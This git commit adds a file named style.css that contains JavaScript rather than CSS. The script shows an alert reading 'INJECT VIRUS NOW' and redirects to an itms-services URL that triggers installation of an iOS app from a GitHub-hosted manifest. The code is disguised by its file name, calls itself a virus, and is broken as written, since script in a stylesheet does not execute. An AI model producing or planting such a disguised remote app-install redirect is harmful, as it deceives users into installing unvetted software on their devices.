dae62569c854dea18ec54ac7dc308ecf3a03f90d
iGeek-OS2 <88642228+iGeek-OS2@users.noreply.github.com>
2022-02-22 20:01:56 +0900

    Add files via upload

---
+++ style.css
@@ -0,0 +1,5 @@
+function changeLocation() {
+  alert('INJECT VIRUS NOW');
+  window.location.href ='itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/iGeek-OS2/Shortcuts/main/Tikto.plist';
+    
+}
